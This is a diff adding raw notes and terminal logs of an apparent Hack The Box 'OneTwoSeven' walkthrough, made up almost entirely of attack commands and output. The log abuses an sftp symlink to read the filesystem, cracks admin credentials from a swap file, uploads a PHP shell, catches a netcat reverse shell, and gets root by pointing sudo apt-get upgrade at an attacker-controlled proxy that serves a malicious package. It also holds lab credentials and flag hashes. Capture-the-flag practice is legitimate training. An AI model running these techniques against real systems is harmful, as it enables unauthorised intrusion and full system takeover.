@@ -1,0 +1,261 @@
+exploits/linux/local/40962.txt
+exploits/linux/remote/40963.txt
+
+
+Express checkout. Yeah!
+
+Your personal account is ready to be used:
+
+Username: ots-iZjhmOTA
+Password: 58bf8f90
+
+You can use the provided credentials to upload your pages via sftp://onetwoseven.htb. Your personal home page will be available here.
+
+oot@kali:~/HTB/Onetwoseven# sftp ots-iZjhmOTA@onetwoseven.htb
+ots-iZjhmOTA@onetwoseven.htb's password: 
+Connected to ots-iZjhmOTA@onetwoseven.htb.
+sftp> ls
+public_html   
+sftp> cd public_html
+sftp> ls
+index.html  
+sftp> get index.html
+Fetching /public_html/index.html to index.html
+/public_html/index.html                                          100%  349     1.0KB/s   00:00    
+sftp> 
+
+
+root@kali:~/HTB/Onetwoseven# ssh ots-iZjhmOTA@onetwoseven.htb
+ots-iZjhmOTA@onetwoseven.htb's password: 
+This service allows sftp connections only.
+Connection to onetwoseven.htb closed.
+
+root@kali:~/HTB/Onetwoseven# sftp ots-yYjhkZTU@onetwoseven.htb
+ots-yYjhkZTU@onetwoseven.htb's password: 
+Connected to ots-yYjhkZTU@onetwoseven.htb.
+sftp> ls
+public_html  
+sftp> cd public_html
+sftp> ls
+index.html   
+sftp> ln -s / rootdir
+sftp> ls -a
+.            ..           index.html   rootdir      
+
+
+Index of /~ots-yYjhkZTU/rootdir
+[ICO]	Name	Last modified	Size	Description
+[PARENTDIR]	Parent Directory	 	- 	 
+[DIR]	etc/	2019-02-20 16:39 	- 	 
+[DIR]	home/	2019-02-15 21:10 	- 	 
+[DIR]	usr/	2019-02-15 21:50 	- 	 
+[DIR]	var/	2019-02-15 19:59 	- 	 
+Apache/2.4.25 (Debian) Server at onetwoseven.htb Port 80
+
+
+Found creds in /var/www/html-admin/login.php.swp
+
+username: ots-admin
+password: 11c5a42c9d74d5442ef3cc835bda1b3e7cc7f494e704a10d0de426b2fbe5cbd8
+
+root@kali:~/HTB/Onetwoseven# hashid 11c5a42c9d74d5442ef3cc835bda1b3e7cc7f494e704a10d0de426b2fbe5cbd8
+Analyzing '11c5a42c9d74d5442ef3cc835bda1b3e7cc7f494e704a10d0de426b2fbe5cbd8'
+[+] Snefru-256 
+[+] SHA-256 
+[+] RIPEMD-256 
+[+] Haval-256 
+[+] GOST R 34.11-94 
+[+] GOST CryptoPro S-Box 
+[+] SHA3-256 
+[+] Skein-256 
+[+] Skein-512(256) 
+
+using hashkiller.co.uk
+11c5a42c9d74d5442ef3cc835bda1b3e7cc7f494e704a10d0de426b2fbe5cbd8 SHA-256 Homesweethome1
+
+
+PORT FORWARD 60080
+ssh -nNT -L 60080:127.0.0.1:60080 ots-yYjhkZTU@onetwoseven.htb
+
+
+root@kali:~/HTB/Onetwoseven# ssh -nNT -L 60080:127.0.0.1:60080 ots-yYjhkZTU@onetwoseven.htb
+ots-yYjhkZTU@onetwoseven.htb's password: 9c2b8de5
+
+goto 127.0.0.1:60080
+
+activate shell at /addons/ after succesful upload
+
+
+
+ENUMERATE BOX
+
+root@kali:~/HTB/Onetwoseven# nc -lvp 1338
+listening on [any] 1338 ...
+connect to [10.10.16.45] from onetwoseven.htb [10.10.10.133] 35924
+whoami
+www-admin-data
+ls -a
+.
+..
+ots-default-user.php
+ots-fs-backup.php
+ots-fs.php
+ots-man-addon.php
+ots-shellz.php
+ots-sysupdate.php
+ots-sysusers.php
+ots-top.php
+ots-uptime.php
+ots-users.php
+cd /
+ls -a
+
+python3 -c "import pty; pty.spawn('/bin/sh');"
+$ 
+
+$ echo $PATH                                
+echo $PATH
+/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+
+$ env
+env
+APACHE_CONFDIR=/etc/apache2-admin
+OLDPWD=/
+APACHE_RUN_DIR=/var/run/apache2-admin
+APACHE_PID_FILE=/var/run/apache2-admin/apache2.pid
+PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+APACHE_LOCK_DIR=/var/lock/apache2-admin
+LANG=C
+APACHE_RUN_USER=www-admin-data
+APACHE_RUN_GROUP=www-admin-data
+APACHE_LOG_DIR=/var/log/apache2-admin
+PWD=/home
+$ 
+$ sudo -l
+sudo -l
+Matching Defaults entries for www-admin-data on onetwoseven:
+    env_reset, env_keep+="ftp_proxy http_proxy https_proxy no_proxy",
+    mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User www-admin-data may run the following commands on onetwoseven:
+    (ALL : ALL) NOPASSWD: /usr/bin/apt-get update, /usr/bin/apt-get upgrade
+$ 
+
+$ grep -v -E "^#" /etc/passwd | awk -F: '$3 == 0 { print $1 }'
+grep -v -E "^#" /etc/passwd | awk -F: '$3 == 0 { print $1 }'
+root
+
+$ uname -a
+uname -a
+Linux onetwoseven 4.9.0-8-amd64 #1 SMP Debian 4.9.144-3.1 (2019-02-19) x86_64 GNU/Linux
+$ 
+
+
+GET USER
+
+$ cat ots-default-user.php
+cat ots-default-user.php
+<?php session_start(); if (!isset ($_SESSION['username'])) { header("Location: /login.php"); }; if ( strpos($_SERVER['REQUEST_URI'], '/addons/') !== false ) { die(); };
+# OneTwoSeven Admin Plugin
+# OTS Default User
+function username() { $ip = '127.0.0.1'; return "ots-" . substr(str_replace('=','',base64_encode(substr(md5($ip),0,8))),3); }
+function password() { $ip = '127.0.0.1'; return substr(md5($ip),0,8); }
+echo "<h4>Default User Credentials</h4><br>";
+echo "<b>Username:</b> ",username(),"<br>";
+echo "<b>Password:</b> ",password(),"<br>";
+?>
+
+$ php ots-default-user.php
+php ots-default-user.php
+PHP Notice:  Undefined index: REQUEST_URI in /var/www/html-admin/addons/ots-default-user.php on line 1
+<h4>Default User Credentials</h4><br><b>Username:</b> ots-yODc2NGQ<br><b>Password:</b> f528764d<br>$ 
+
+root@kali:~/HTB/Onetwoseven# sftp ots-yODc2NGQ@onetwoseven.htb
+ots-yODc2NGQ@onetwoseven.htb's password: 
+Connected to ots-yODc2NGQ@onetwoseven.htb.
+sftp> ls -a
+.            ..           public_html  user.txt     
+sftp> cat user.txt
+Invalid command.
+sftp> get user.txt
+Fetching /user.txt to user.txt
+/user.txt                                                                                        100%   33     0.1KB/s   00:00    
+sftp> exit
+root@kali:~/HTB/Onetwoseven# ls
+dirb.txt  index.html  login.php.swp  nmap.txt  note.txt  Onetwoseven.txt  shell.php  uploadshell.req  user.txt
+root@kali:~/HTB/Onetwoseven# cat user.txt
+93a4ce6d82bd35da033206ef98b486f4
+root@kali:~/HTB/Onetwoseven# 
+
+
+www-admin-data@onetwoseven:/var/www/html-admin/addons$ apt --version
+apt --version
+apt 1.4.9 (amd64)
+
+www-admin-data@onetwoseven:/tmp$ sudo http_proxy="http://10.10.16.45" apt-get update
+<sudo http_proxy="http://10.10.16.45" apt-get update
+Ign:1 http://de.deb.devuan.org/merged ascii InRelease
+Ign:2 http://packages.onetwoseven.htb/devuan ascii InRelease      
+Get:3 http://packages.onetwoseven.htb/devuan ascii Release [1528 B]
+Ign:4 http://de.deb.devuan.org/merged ascii-security InRelease
+Ign:5 http://de.deb.devuan.org/merged ascii-updates InRelease         
+Ign:6 http://packages.onetwoseven.htb/devuan ascii Release.gpg    
+Err:7 http://de.deb.devuan.org/merged ascii Release               
+  404  File not found
+Get:8 http://packages.onetwoseven.htb/devuan ascii/main amd64 Packages [998 B]
+Err:9 http://de.deb.devuan.org/merged ascii-security Release          
+  404  File not found
+Err:10 http://de.deb.devuan.org/merged ascii-updates Release
+  404  File not found
+Reading package lists... Done
+W: The repository 'http://packages.onetwoseven.htb/devuan ascii Release' is not signed.
+N: Data from such a repository can't be authenticated and is therefore potentially dangerous to use.
+N: See apt-secure(8) manpage for repository creation and user configuration details.
+E: The repository 'http://de.deb.devuan.org/merged ascii Release' does no longer have a Release file.
+N: Updating from such a repository can't be done securely, and is therefore disabled by default.
+N: See apt-secure(8) manpage for repository creation and user configuration details.
+E: The repository 'http://de.deb.devuan.org/merged ascii-security Release' does no longer have a Release file.
+N: Updating from such a repository can't be done securely, and is therefore disabled by default.
+N: See apt-secure(8) manpage for repository creation and user configuration details.
+E: The repository 'http://de.deb.devuan.org/merged ascii-updates Release' does no longer have a Release file.
+N: Updating from such a repository can't be done securely, and is therefore disabled by default.
+N: See apt-secure(8) manpage for repository creation and user configuration details.
+www-admin-data@onetwoseven:/tmp$ sudo http_proxy="http://10.10.16.45" apt-get upgrade
+<udo http_proxy="http://10.10.16.45" apt-get upgrade
+Reading package lists... Done
+Building dependency tree       
+Reading state information... Done
+Calculating upgrade... Done
+The following packages will be upgraded:
+  reportbug
+1 upgraded, 0 newly installed, 0 to remove and 0 not upgraded.
+Need to get 128 kB of archives.
+After this operation, 0 B of additional disk space will be used.
+Do you want to continue? [Y/n] y
+y
+WARNING: The following packages cannot be authenticated!
+  reportbug
+Install these packages without verification? [y/N] y
+y
+Get:1 http://packages.onetwoseven.htb/devuan ascii/main amd64 reportbug all 9.1.6+devuan2.1 [128 kB]
+Fetched 128 kB in 3s (38.7 kB/s)    
+Reading changelogs... Done
+debconf: unable to initialize frontend: Dialog
+debconf: (Dialog frontend will not work on a dumb terminal, an emacs shell buffer, or without a controlling terminal.)
+debconf: falling back to frontend: Readline
+(Reading database ... 33940 files and directories currently installed.)
+Preparing to unpack .../reportbug_9.1.6+devuan2.1_all.deb ...
+Unpacking reportbug (9.1.6+devuan2.1) over (7.1.6+devuan2.1) ...
+Processing triggers for mime-support (3.60) ...
+Setting up reportbug (9.1.6+devuan2.1) ...
+FUCK YOU MICHAEL
+Processing triggers for man-db (2.7.6.1-2) ...
+www-admin-data@onetwoseven:/tmp$ ls -a
+ls -a
+.  ..  root.txt
+www-admin-data@onetwoseven:/tmp$ cat root.txt
+cat root.txt
+2d380a25a8e3bfc095abd9e691841048
+www-admin-data@onetwoseven:/tmp$ 
+
